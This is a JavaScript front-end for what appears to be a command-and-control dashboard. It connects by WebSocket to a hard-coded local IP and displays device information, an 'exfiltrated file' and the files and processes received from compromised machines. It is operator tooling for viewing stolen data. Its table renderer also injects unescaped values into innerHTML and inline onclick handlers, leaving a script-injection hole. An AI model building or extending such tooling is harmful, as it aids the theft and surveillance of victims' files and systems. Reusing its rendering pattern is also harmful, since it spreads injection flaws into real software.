function formatAsTable(jsonData) {
    if (typeof jsonData === "string") {
        try {
            jsonData = JSON.parse(jsonData);
        } catch (e) {
            console.error("Invalid JSON", e);
        }
    }
    let table = `<table>`;
    for (let key in jsonData) {
        let value = jsonData[key];
        if (Array.isArray(value)) {
            value = value.join("<br>");
        } else if (typeof value === "string") {
            value = value.replace(/\n/g, "<br>");
        }
        if (key.toLowerCase() === "file" && value.length > 100) {
            value = `<span style="word-break: break-word;">${value.substring(0, 100)}... <span style="color: #00ff7f; cursor: pointer;" onclick="this.parentElement.innerHTML='${value}';">[Show more]</span></span> <span onclick="copyToClipboard('${value}')" style="color: #00ff7f; cursor: pointer;">[Copy]</span>`;
        }
        table += `<tr><td style="color: #00ff7f;font-weight: bold;">${key}</td><td><pre>${value}</pre></td></tr>`;
    }
    table += `</table>`;
    return table;
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showToast("Copied to clipboard!", "success");
    }).catch(err => {
        console.error("Failed to copy:", err);
        showToast("Failed to copy!", "error");
    });
}

function showToast(message, type) {
    let toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.innerText = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = "0";
        setTimeout(() => toast.remove(), 500);
    }, 3000);
}

document.addEventListener("DOMContentLoaded", function() {
    const socket = new WebSocket("ws://192.168.133.139:5000/ws");
    const statusIndicator = document.getElementById("status-indicator");
    const statusText = document.getElementById("status-text");
    const deviceInfoContainer = document.getElementById("device-info");
    const exfiltratedFileContainer = document.getElementById("exfiltrated-file");
    const filesProcessesContainer = document.getElementById("files-processes");
    socket.onopen = () => {
        console.log("Connected to WebSocket");
        statusIndicator.style.backgroundColor = "#00ff7f";
        statusText.innerText = "Connected";
    };
    socket.onmessage = (event) => {
        console.log("Received data:", event.data);
        const data = JSON.parse(event.data);
        deviceInfoContainer.innerHTML = formatAsTable(data.device_info || {});
        exfiltratedFileContainer.innerHTML = formatAsTable(data.exfiltrated_file || {});
        filesProcessesContainer.innerHTML = formatAsTable(data.files_processes || {});
    };
    socket.onclose = () => {
        console.log("Disconnected from WebSocket");
        statusIndicator.style.backgroundColor = "red";
        statusText.innerText = "Disconnected";
    };
    socket.onerror = (error) => {
        console.log("WebSocket Error:", error);
    };
});
